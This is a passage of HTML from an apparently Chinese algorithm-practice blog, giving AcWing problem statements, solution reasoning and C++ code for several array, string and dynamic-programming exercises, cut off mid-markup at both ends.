class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">GetDigit</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n) &#123;</span><br><span class="line">      res++;</span><br><span class="line">      n /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Week-5">Week 5</h1><h2 id="数字序列中某一位的数字★"><a href="https://www.acwing.com/problem/content/52/">数字序列中某一位的数字★</a></h2><p>数字以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0123456789101112131415</mn><mo>…</mo></mrow><annotation encoding="application/x-tex">0123456789101112131415…</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0123456789101112131415</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span></span></span></span> 的格式序列化到一个字符序列中。</p><p>在这个序列中，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> 位（从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 开始计数）是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span>，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>13</mn></mrow><annotation encoding="application/x-tex">13</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">13</span></span></span></span> 位是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>19</mn></mrow><annotation encoding="application/x-tex">19</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">19</span></span></span></span> 位是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span>，等等。</p><p>请写一个函数求任意位对应的数字。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo></mrow><annotation encoding="application/x-tex">0 \le</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span></span></span></span> 输入数字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>≤</mo><mn>2147483647</mn></mrow><annotation encoding="application/x-tex">\le 2147483647</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2147483647</span></span></span></span></p><p><strong>样例</strong></p><pre><code>输入：13输出：1</code></pre><h3 id="题解-7">题解</h3><blockquote><p>转化问题：<br>数字字符序列为12345678910…，第1位为1 （对于0特判，直接返回0）<br>这个问题的返回结果与原问题相同，这样等价处理的好处是：对于1位数来说，其个数为9，与n位数的情况能统一起来，这样写出来的代码更简洁</p></blockquote><p>思路</p><ol><li>确定是i位数字: n - 1 * 9 - 2 * 90 - 3 * 900 …</li><li>确定是i位数字的第几个, 即确定具体number<br>比如从base=1000开始的4位, 第(n=4)/3上取整=2, 则number = base + [n/i] - 1 = 101 (<mark>向上取整</mark>)</li><li>属于number的第几位<br>注意取余数时, 如果n%i == 0, 则应当对应r = i位, 比如1012的第4位是2 (4%4=0)</li><li>求number的第r位是多少<br>比如12345的r = 2，那么就需要将小数点向右移动5-2=3位，然后通过<code>% 10</code>求此时个位数数字</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">digitAtIndex</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> dgt = <span class="number">1</span>, start = <span class="number">1</span>, count = <span class="number">9</span>; <span class="comment">// long long</span></span><br><span class="line">    <span class="keyword">while</span> (n &gt; dgt * count) &#123;  <span class="comment">// dgt * count才是dgt位数占的总位数</span></span><br><span class="line">      n -= dgt * count;</span><br><span class="line">      dgt++;</span><br><span class="line">      start *= <span class="number">10</span>;</span><br><span class="line">      count *= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> num = start + (n + dgt - <span class="number">1</span>) / dgt - <span class="number">1</span>; <span class="comment">// 向上取整数 + 第i个数是start + i - 1</span></span><br><span class="line">    <span class="type">int</span> r = (n % dgt)? (n % dgt): dgt;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; dgt - r; j++) num /= <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> num % <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="把数组排成最小的数★"><a href="https://www.acwing.com/problem/content/54/">把数组排成最小的数★</a></h2><p>输入一个正整数数组，把数组里所有数字拼接起来排成一个数，打印能拼接出的所有数字中最小的一个。</p><p>例如输入数组 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>3</mn><mo separator="true">,</mo><mn>32</mn><mo separator="true">,</mo><mn>321</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[3, 32, 321]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">32</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">321</span><span class="mclose">]</span></span></span></span>，则打印出这 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> 个数字能排成的最小数字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>321323</mn></mrow><annotation encoding="application/x-tex">321323</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">321323</span></span></span></span>。</p><p><strong>数据范围</strong></p><p>数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[3, 32, 321]输出：321323</code></pre><p><strong>注意</strong>：输出数字的格式为字符串。</p><h3 id="重写cmp函数">重写cmp函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">cmp</span><span class="params">(string &amp;s1, string &amp;s2)</span> </span>&#123;  <span class="comment">// static</span></span><br><span class="line">    <span class="keyword">return</span> s1 + s2 &lt;= s2 + s1; </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function">string <span class="title">printMinNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    vector&lt;string&gt; nums_strs;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) nums_strs.<span class="built_in">push_back</span>(<span class="built_in">to_string</span>(x));</span><br><span class="line">    <span class="built_in">sort</span>(nums_strs.<span class="built_in">begin</span>(), nums_strs.<span class="built_in">end</span>(), cmp);  <span class="comment">// cmp</span></span><br><span class="line">    string res;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums_strs) res += x;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="把数字翻译成字符串"><a href="https://www.acwing.com/problem/content/55/">把数字翻译成字符串</a></h2><p>给定一个数字，我们按照如下规则把它翻译为字符串：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 翻译成 <code>a</code>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 翻译成 <code>b</code>，……，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>11</mn></mrow><annotation encoding="application/x-tex">11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span> 翻译成 <code>l</code>，……，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>25</mn></mrow><annotation encoding="application/x-tex">25</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">25</span></span></span></span> 翻译成 <code>z</code>。</p><p>一个数字可能有多个翻译。</p><p>例如 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>12258</mn></mrow><annotation encoding="application/x-tex">12258</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12258</span></span></span></span> 有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> 种不同的翻译，它们分别是 <code>bccfi</code>、<code>bwfi</code>、<code>bczi</code>、<code>mcfi</code> 和 <code>mzi</code>。</p><p>请编程实现一个函数用来计算一个数字有多少种不同的翻译方法。</p><p><strong>数据范围</strong></p><p>输入数字位数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>101</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,101]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">101</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：&quot;12258&quot;输出：5</code></pre><h3 id="DP-2">DP</h3><p><strong>状态表示</strong> f[i]:前i位数字有多少种不同的表示方法</p><p><strong>状态计算</strong> f[i] = f[i - 1] + f[i - 2]<br>前后分别对应将第i位数字单独翻译、 第i-1位和第i位一起进行翻译(必须合法:0~25且不能为05等, 即必须10~25)</p><p><strong>边界情况</strong> f[0] = 1: 让f[1]和f[2]数值正确</p><blockquote><p>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>u</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">num</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span></span></span></span> 第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo separator="true">,</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">1, 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span></span></span></span> 位的组成的数字 ∈[10,25] 时，显然应有 2 种翻译方法，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo><mo>=</mo><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo>+</mo><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">dp[2] = dp[1] + dp[0] = 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord">2</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> ，而显然 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">dp[1] = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> ，因此推出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy="false">[</mo><mn>0</mn><mo stretchy="false">]</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">dp[0] = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getTranslationCount</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">f</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    f[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      f[i] = f[i - <span class="number">1</span>];</span><br><span class="line">      <span class="type">int</span> t = (i &gt;= <span class="number">2</span>) * (<span class="number">10</span> * (s[i - <span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>) + s[i - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (t &gt;= <span class="number">10</span> &amp;&amp; t &lt;= <span class="number">25</span>) f[i] += f[i - <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f[n];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="礼物的最大价值"><a href="https://www.acwing.com/problem/content/56/">礼物的最大价值</a></h2><p>在一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">m \times n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的棋盘的每一格都放有一个礼物，每个礼物都有一定的价值（价值大于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>）。</p><p>你可以从棋盘的左上角开始拿格子里的礼物，并每次向右或者向下移动一格直到到达棋盘的右下角。</p><p>给定一个棋盘及其上面的礼物，请计算你最多能拿到多少价值的礼物？</p><p><strong>注意：</strong></p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">m, n \gt 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>×</mo><mi>n</mi><mo>≤</mo><mn>1350</mn></mrow><annotation encoding="application/x-tex">m \times n \le 1350</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1350</span></span></span></span></li></ul><p><strong>样例：</strong></p><pre><code>输入：[  [2,3,1],  [1,7,1],  [4,6,1]]输出：19解释：沿着路径 2→3→7→6→1 可以得到拿到最大价值礼物。</code></pre><h3 id="DP-3">DP</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getMaxValue</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;grid)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = grid.<span class="built_in">size</span>(), m = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">f</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">        f[i][j] = <span class="built_in">max</span>(f[i - <span class="number">1</span>][j], f[i][j - <span class="number">1</span>]) + grid[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f[n][m];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="最长不含重复字符的子字符串★"><a href="https://www.acwing.com/problem/content/57/">最长不含重复字符的子字符串★</a></h2><p>请从字符串中找出一个最长的不包含重复字符的子字符串，计算该最长子字符串的长度。</p><p>假设字符串中只包含从 <code>a</code> 到 <code>z</code> 的字符。</p><p><strong>数据范围</strong></p><p>输入字符串长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：&quot;abcabc&quot;输出：3</code></pre><h3 id="双指针-利用hash快速查重">双指针 + 利用hash快速查重</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">longestSubstringWithoutDuplication</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;  <span class="comment">// 用0不同特判s.empty()</span></span><br><span class="line">    unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; hash;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; j &lt; s.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">      hash[s[j]]++;</span><br><span class="line">      <span class="keyword">while</span> (hash[s[j]] &gt; <span class="number">1</span>) hash[s[i++]]--;  <span class="comment">// 不用i &lt; j</span></span><br><span class="line">      res = <span class="built_in">max</span>(res, j - i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="丑数★"><a href="https://www.acwing.com/problem/content/58/">丑数★</a></h2><p>我们把只包含质因子 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mtext>、</mtext><mn>3</mn></mrow><annotation encoding="application/x-tex">2、3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">2</span><span class="mord cjk_fallback">、</span><span class="mord">3</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> 的数称作丑数（Ugly Number）。</p><p>例如 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn><mtext>、</mtext><mn>8</mn></mrow><annotation encoding="application/x-tex">6、8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">6</span><span class="mord cjk_fallback">、</span><span class="mord">8</span></span></span></span> 都是丑数，但 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>14</mn></mrow><annotation encoding="application/x-tex">14</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">14</span></span></span></span> 不是，因为它包含质因子 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span 